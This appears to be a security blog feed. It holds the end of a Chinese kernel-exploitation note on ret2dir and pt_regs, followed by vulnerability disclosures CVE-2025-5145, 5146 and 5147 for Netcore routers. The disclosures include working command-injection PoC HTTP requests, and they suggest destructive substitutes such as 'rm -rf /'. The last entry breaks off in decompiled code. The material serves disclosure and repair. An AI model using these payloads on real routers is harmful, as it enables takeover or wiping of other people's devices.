area</code>（即线性映射区域），它线性映射了整个物理内存空间。也就是说，用户空间内存都可以在此区域上找到，我们通过这个内核空间地址便能直接访问到用户空间的数据，从而避开了传统的隔绝用户空间与内核空间的防护手段（<code>smep/smap/kpti</code>）</p><p><img src="/image/learning_linux_kernel_1/1740317897176.png" alt="1740317897176"></p><p> <code>ret2dir</code> 攻击的手段有如下：</p><ul><li>利用 mmap 在用户空间大量喷射内存</li><li><img src="/image/learning_linux_kernel_1/1740317914274.png" alt="1740317914274"></li><li>利用漏洞泄露出内核的“堆”上地址（通过 kmalloc 获取到的地址），这个地址直接来自于线性映射区</li><li>利用泄露出的内核线性映射区的地址进行内存搜索 ，从而找到我们在用户空间喷射的内存</li></ul><p><img src="/image/learning_linux_kernel_1/1740317331256.png" alt="1740317331256"></p><h4 id="pt-regs结构体"><a href="#pt-regs结构体" class="headerlink" title="pt_regs结构体"></a>pt_regs结构体</h4><p>在进行系统调用时，会完成从用户态到内核态的切换，需要保存用户态时的上下文寄存器，而这些寄存器的值都需要保存在 <code>pt_regs</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以利用如下 <code>exp</code>查看 <code>pt_regs</code> 结构体和设置某些未被题目 <code>ioctl</code>特殊设置的寄存器来实施栈迁移操作。</p><p>调试时可以在 <code>entry_SYSCALL_64</code>函数处下断点，随后通过系统调用表跳转到对应的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">target =  <span class="number">0xffff888000000000</span> + <span class="number">0x6000000</span>;</span><br><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   0x10;&quot;</span> <span class="comment">//ioctl</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   0x1BF52;&quot;</span> <span class="comment">//cmd</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-5145</title>
      <link href="/2025/05/08/2025-05-8-CVE-2025-5145/"/>
      <url>/2025/05/08/2025-05-8-CVE-2025-5145/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Unauthorized-Command-Injection-Vulnerability-in-Multiple-Router-and-Wireless-AP-Products-of-Netcore"><a href="#Unauthorized-Command-Injection-Vulnerability-in-Multiple-Router-and-Wireless-AP-Products-of-Netcore" class="headerlink" title="Unauthorized Command Injection Vulnerability in Multiple Router and Wireless AP Products of Netcore"></a>Unauthorized Command Injection Vulnerability in Multiple Router and Wireless AP Products of Netcore</h1><h2 id="I-Involved-Products-and-Firmware-Download-Addresses"><a href="#I-Involved-Products-and-Firmware-Download-Addresses" class="headerlink" title="I. Involved Products and Firmware Download Addresses"></a>I. Involved Products and Firmware Download Addresses</h2><p>NBR1005GPEV2：<a href="https://www.netcoretec.com/service-support/download/firmware/2707.html">https://www.netcoretec.com/service-support/download/firmware/2707.html</a></p><p>B6V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2703.html">https://www.netcoretec.com/service-support/download/firmware/2703.html</a></p><p>COVER5：<a href="https://www.netcoretec.com/service-support/download/firmware/2680.html">https://www.netcoretec.com/service-support/download/firmware/2680.html</a></p><p>NAP930：<a href="https://www.netcoretec.com/service-support/download/firmware/2704.html">https://www.netcoretec.com/service-support/download/firmware/2704.html</a></p><p>NAP830：<a href="https://www.netcoretec.com/service-support/download/firmware/2708.html">https://www.netcoretec.com/service-support/download/firmware/2708.html</a></p><p>NBR100V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2706.html">https://www.netcoretec.com/service-support/download/firmware/2706.html</a></p><p>NBR200V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2705.html">https://www.netcoretec.com/service-support/download/firmware/2705.html</a></p><p>POWER13：<a href="https://www.netcoretec.com/service-support/download/firmware/2700.html">https://www.netcoretec.com/service-support/download/firmware/2700.html</a></p><h2 id="II-Cause-of-the-Vulnerability"><a href="#II-Cause-of-the-Vulnerability" class="headerlink" title="II. Cause of the Vulnerability"></a>II. Cause of the Vulnerability</h2><p>Under the file system directory <code>/www/cgi-bin/</code>, there are shell script files such as <code> acbackup</code>, <code>backup</code>, <code>upgrade</code>, <code>ac_upgrade</code>, and <code>upgradeAP</code>. These scripts will first process the request fields using the urldecode function, then split the param by <code>&amp;</code>, and then separate the <code>key</code>and <code>val </code>by <code>=</code>. Finally, this command  <code>eval &quot;${key}=&#39;${val}&#39;&quot;</code>is executed.Obviously, the <code>key</code> is not wrapped in single quotes (<code>&#39;</code>), and <code>eval</code> will perform a secondary parsing of the expanded string. If the <code>key</code> is an executable command, <code>eval</code> will directly execute that command.</p><p><img src="/image/CVE-2025-5145/1746586581734.png" alt="1746586581734"></p><p>This vulnerability exists in the Query String parsing logic of the router’s Web management interface. Attackers can construct malicious URL parameters to bypass the filtering of most metacharacters by urldecode and only use the <strong>newline character</strong> as the command delimiter. This function filters a variety of metacharacters, parses <code>%XX</code> in the URL to <code>\xXX</code> and then to the real character, and replaces the + character with a space.</p><p><img src="/image/CVE-2025-5145/1746586587320.png" alt="1746586587320"></p><p>In <code>/usr/sbin/uhttpd</code>, by combining the source code found online and the decompiled code, when the client initiates an HTTP request prefixed with <code>/cgi‑bin/</code>, uHTTPd will transfer the request to the corresponding CGI program. It will first call clearenv() in the child process and set environment variables such as REQUEST_METHOD, QUERY_STRING, CONTENT_LENGTH, and SCRIPT_NAME according to the CGI specification. Finally, it calls the script itself through execl(), and the script uses the environment variables to receive the request parameters.</p><p><img src="/image/CVE-2025-5145/1746516698127.png" alt="1746516698127"></p><h2 id="III-Explanation-of-the-POC"><a href="#III-Explanation-of-the-POC" class="headerlink" title="III. Explanation of the POC"></a>III. Explanation of the POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/acbackup?mkdir+/tmp/test1+%0Afoo=bar&amp;mac=123 HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 128</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.50.2/login.html&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;id&quot;: 1, &quot;method&quot;: &quot;call&quot;, &quot;params&quot;: [ &quot;00000000000000000000000000000000&quot;, &quot;routerd&quot;, &quot;login_name_get&quot;,&#123;&#125; ] &#125;</span><br></pre></td></tr></table></figure><p>The request content can be arbitrary. Scripts like acbackup will parse the Query String, and commands such as <code> mkdir+/tmp/test1</code> can be replaced with commands like <code> reboot</code>, <code>rm+-rf+/+</code> and other commands to cause damage to the router.</p><h2 id="IV-Demonstration-Video"><a href="#IV-Demonstration-Video" class="headerlink" title="IV. Demonstration Video"></a>IV. Demonstration Video</h2><p>The video demonstrates the vulnerability demonstration taking NBR1005GPEV2 as an example. The injected commands are <code>mkdir /tmp/test1</code>, <code>mkdir /tmp/test2</code>, <code>reboot</code> (with a delay), <code>rm -rf /</code>, and the code <code>echo &quot;$key&quot; &gt; /dev/console</code> is added in acbackup to more intuitively see the string when the parameter query_string is assigned to the key after a series of parsing processes.</p><h2 id="V-Repair-Suggestions"><a href="#V-Repair-Suggestions" class="headerlink" title="V. Repair Suggestions"></a>V. Repair Suggestions</h2><p>Change the vulnerable execution statement <code>eval &quot;${key}=&#39;${val}&#39;&quot;</code> in the corresponding script to <code>eval &quot;&#39;${key}&#39;=&#39;${val}&#39;&quot;</code>, and add the filtering of CRLF in urldecode.</p><p><strong>Discoverer: Exploo0Osion.<br>Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.</strong></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-5146</title>
      <link href="/2025/05/08/2025-05-8-CVE-2025-5146/"/>
      <url>/2025/05/08/2025-05-8-CVE-2025-5146/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-and-Wireless-APs-After-Authorization"><a href="#Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-and-Wireless-APs-After-Authorization" class="headerlink" title="Arbitrary Command Injection Vulnerability in Netcore Routers and Wireless APs After Authorization"></a>Arbitrary Command Injection Vulnerability in Netcore Routers and Wireless APs After Authorization</h1><h2 id="I-Affected-Products-and-Firmware-Download-Links"><a href="#I-Affected-Products-and-Firmware-Download-Links" class="headerlink" title="I. Affected Products and Firmware Download Links"></a>I. Affected Products and Firmware Download Links</h2><p>NBR1005GPEV2：<a href="https://www.netcoretec.com/service-support/download/firmware/2707.html">https://www.netcoretec.com/service-support/download/firmware/2707.html</a></p><p>B6V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2703.html">https://www.netcoretec.com/service-support/download/firmware/2703.html</a></p><p>COVER5：<a href="https://www.netcoretec.com/service-support/download/firmware/2680.html">https://www.netcoretec.com/service-support/download/firmware/2680.html</a></p><p>NAP930：<a href="https://www.netcoretec.com/service-support/download/firmware/2704.html">https://www.netcoretec.com/service-support/download/firmware/2704.html</a></p><p>NAP830：<a href="https://www.netcoretec.com/service-support/download/firmware/2708.html">https://www.netcoretec.com/service-support/download/firmware/2708.html</a></p><p>NBR100V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2706.html">https://www.netcoretec.com/service-support/download/firmware/2706.html</a></p><p>NBR200V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2705.html">https://www.netcoretec.com/service-support/download/firmware/2705.html</a></p><h2 id="II-Vulnerability-Causes"><a href="#II-Vulnerability-Causes" class="headerlink" title="II. Vulnerability Causes"></a>II. Vulnerability Causes</h2><p>The firmware of these routers uses the <code>uhttpd</code> + <code>ubus</code> architecture.</p><p><strong>uhttpd (Web Server)</strong></p><ul><li>Listens on port <code>80</code> (HTTP) and accepts <code>POST /ubus</code> requests.</li><li>Parses the request header to confirm the <code>Content-Type</code> is <code>application/x-www-form-urlencoded</code>, but the actual payload is JSON (non-standard but common).</li><li>Forwards requests to the <code>ubus</code> RPC service (typically via <code>ubus</code> Unix Socket or CGI interface).</li></ul><p>Running the <code>ubus list</code> command shows registered ubus services</p><p><img src="/image/CVE-2025-5146/1746600757491.png" alt="1746600757491"></p><p>The vulnerability is found in <code>routerd</code> (file: <code>/usr/bin/routerd</code>). In its data segment, the callback function for the <code>passwd_set</code> method is <code>sub_416260</code></p><p><img src="/image/CVE-2025-5146/1746600953768.png" alt="1746600953768"></p><p>In <code>sub_416260</code>, <code>blobmsg_parse</code> parses Blob format data (OpenWrt’s binary JSON format, see image:</p><p><img src="/image/CVE-2025-5146/1746601012709.png" alt="1746601012709"></p><p>The structure mapping is:</p><ul><li><code>v19</code> → <code>user</code> (username)</li><li><code>v20</code> → <code>pwd</code> (password), with <code>v16 = v20</code></li><li><code>v21</code> → <code>by</code> (empty if not provided in the request)</li></ul><p><img src="/image/CVE-2025-5146/1746601107563.png" alt="1746601107563"></p><p>The username from <code>v19</code> is extracted, skipping the Blobmsg header. Each character is checked to ensure it is <code>_</code> (ASCII <code>0x5F</code>) or alphanumeric (via <code>isalnum</code>). Illegal characters trigger an error log</p><p><img src="/image/CVE-2025-5146/1746601255662.png" alt="1746601255662"></p><p>The password from <code>v16</code> (stored as <code>v17</code>, skipping the Blobmsg header) is passed to <code>passwd_set_api</code>  <strong>without any validation</strong> . This function executes <code>passwd_set_api(username, password)</code>.</p><p>If the result is <code>0</code> (success), and the username is “root” with <code>v15</code> (value of the <code>by</code> field) not equal to “ac”, the code writes <code>v17</code> to:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uci <span class="built_in">set</span> auto_ac.auto_ac.passwd=%s; uci commit auto_ac</span><br></pre></td></tr></table></figure><p>and calls <code>system()</code> with this command, creating a <strong>command injection vulnerability</strong></p><p><img src="/image/CVE-2025-5146/1746601374783.png" alt="1746601374783"></p><p>In <code>passwd_set_api</code>, the password (<code>a2</code>) is not validated</p><p><img src="/image/CVE-2025-5146/1746601489477.png" alt="1746601489477"></p><p>If a password exists, it constructs commands:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(v10, <span class="number">0x80u</span>, <span class="string">&quot;passwd %s&quot;</span>, a1);  <span class="comment">// e.g., &quot;passwd root&quot;</span></span><br><span class="line"><span class="built_in">snprintf</span>(v11, <span class="number">0x80u</span>, <span class="string">&quot;%s\n&quot;</span>, a2);       <span class="comment">// e.g., &quot;admin123\n&quot;</span></span><br><span class="line">v4 = popen(v10, <span class="string">&quot;w&quot;</span>);                   <span class="comment">// Opens a command pipe for writing</span></span><br><span class="line">fwrite(v11, ...);                        <span class="comment">// Writes the password twice (for confirmation)</span></span><br></pre></td></tr></table></figure><p>On success, it returns <code>0</code>, leading to the command injection vulnerability</p><p><img src="/image/CVE-2025-5146/1746601700013.png" alt="1746601700013"></p><h2 id="III-POC-Explanation"><a href="#III-POC-Explanation" class="headerlink" title="III. POC Explanation"></a>III. POC Explanation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /ubus HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">Content-Length: 163</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Accept: application/json, text/javascript, /; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Referer: http://192.168.50.2/guide/guide.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:22,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;a9c61fc83080b13ded7512db83c9b123&quot;,&quot;routerd&quot;,&quot;passwd_set&quot;,&#123;&quot;user&quot;:&quot;root&quot;,&quot;pwd&quot;:&quot;admin123;mkdir -p /tmp/test1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><ul><li>Replace the <code>sid</code> in the <code>params</code> field (first value, e.g., <code>&quot;a9c61fc83080b13ded7512db83c9b123&quot;</code>) with the actual session ID obtained after login.</li><li>The command <code>mkdir -p /tmp/test1</code> can be replaced with any arbitrary command.</li></ul><p>Demonstration of remote shell access:</p><p><img src="/image/CVE-2025-5146/1746603016270.png" alt="1746603016270"></p><h2 id="IV-Recommended-Solution"><a href="#IV-Recommended-Solution" class="headerlink" title="IV. Recommended Solution"></a>IV. Recommended Solution</h2><p>Apply the same validation used for the username to the password: restrict it to contain only underscores, letters, and numbers.</p><p><strong>Discoverer: Exploo0Osion.</strong></p><p><strong>Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.</strong></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-5147</title>
      <link href="/2025/05/08/2025-05-8-CVE-2025-5147/"/>
      <url>/2025/05/08/2025-05-8-CVE-2025-5147/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-Including-NBR1005GPE-B6-and-NBR200-After-Authorization"><a href="#Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-Including-NBR1005GPE-B6-and-NBR200-After-Authorization" class="headerlink" title="Arbitrary Command Injection Vulnerability in Netcore Routers Including NBR1005GPE, B6, and NBR200 After Authorization"></a>Arbitrary Command Injection Vulnerability in Netcore Routers Including NBR1005GPE, B6, and NBR200 After Authorization</h1><h2 id="Affected-Products-and-Firmware-Download-Links"><a href="#Affected-Products-and-Firmware-Download-Links" class="headerlink" title="Affected Products and Firmware Download Links"></a>Affected Products and Firmware Download Links</h2><p>NBR1005GPEV2：<a href="https://www.netcoretec.com/service-support/download/firmware/2707.html">https://www.netcoretec.com/service-support/download/firmware/2707.html</a></p><p>B6V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2703.html">https://www.netcoretec.com/service-support/download/firmware/2703.html</a></p><p>NBR200V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2705.html">https://www.netcoretec.com/service-support/download/firmware/2705.html</a></p><h2 id="II-Vulnerability-Causes"><a href="#II-Vulnerability-Causes" class="headerlink" title="II. Vulnerability Causes"></a>II. Vulnerability Causes</h2><p>The firmware of these routers uses the <code>uhttpd</code> + <code>ubus</code> architecture.</p><p><strong>uhttpd (Web Server)</strong></p><ul><li>Listens on port <code>80</code> (HTTP) and accepts <code>POST /ubus</code> requests.</li><li>Parses the request header to confirm the <code>Content-Type</code> is <code>application/x-www-form-urlencoded</code>, but the actual payload is JSON (non-standard but common).</li><li>Forwards requests to the <code>ubus</code> RPC service (typically via <code>ubus</code> Unix Socket or CGI interface).</li></ul><p>Running the <code>ubus list</code> command shows registered ubus services</p><p><img src="/image/CVE-2025-5147/1746692696110.png" alt="1746692696110"></p><p>The vulnerability is found in  <code>network_tools</code>(file: <code>/usr/bin/network_tools</code>). In its data segment, the callback function for the <code>tools_ping</code> method is <code>sub_401EB8</code></p><p><img src="/image/CVE-2025-5147/1746696917202.png" alt="1746696917202"></p><p>In <code>sub_401EB8</code>, <code>blobmsg_parse</code> parses Blob format data (OpenWrt’s binary JSON format)</p><p>Parameter values are received through the pointer array <code>v22</code> to <code>v26</code>:</p><ul><li><code>v22</code>: Pointer to the <code>blob_attr</code> of the <code>action</code> field</li><li><code>v23</code>: Pointer to the <code>blob_attr</code> of the <code>url</code> field</li><li><code>v24</code>: Pointer to the <code>blob_attr</code> of the <code>count</code> field</li><li><code>v25</code>: Pointer to the <code>blob_attr</code> of the <code>size</code> field</li><li><code>v26</code>: Pointer to the <code>blob_attr</code> of the <code>wanid</code> field</li></ul><p><img src="/image/CVE-2025-5147/1746697358269.png" alt="1746697358269"></p><p>The string value of the <code>action</code> field in <code>v22</code> is passed to <code>v19</code>. If <code>v19</code> matches the string <code>&quot;start&quot;</code>, the code enters the <code>if</code> branch and passes the pointer array <code>v22</code>~&#96;v26<code>to the</code>v27&#96; array:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v27[<span class="number">0</span>] = <span class="string">&quot;start&quot;</span>;         <span class="comment">// action  </span></span><br><span class="line">v27[<span class="number">1</span>] = url_str_ptr;     <span class="comment">// String pointer (e.g., &quot;192.168.50.2&quot;)  </span></span><br><span class="line">v27[<span class="number">2</span>] = count_int;       <span class="comment">// Converted integer (e.g., 5)  </span></span><br><span class="line">v27[<span class="number">3</span>] = size_int;        <span class="comment">// Converted integer (e.g., 64)  </span></span><br><span class="line">v27[<span class="number">4.</span>.] = wanid_related; <span class="comment">// Optional fields parsed via sub_4019A8  </span></span><br></pre></td></tr></table></figure><p>The code then jumps to <code>LABEL_18</code> and calls the <code>tools_ping((int)v27)</code> function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_401EB8</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">unsigned</span> __int8 *a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v11; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v13; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v18; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// [sp+20h] [-84h]</span></span><br><span class="line">  _BYTE *v22; <span class="comment">// [sp+38h] [-6Ch] BYREF</span></span><br><span class="line">  _BYTE *v23; <span class="comment">// 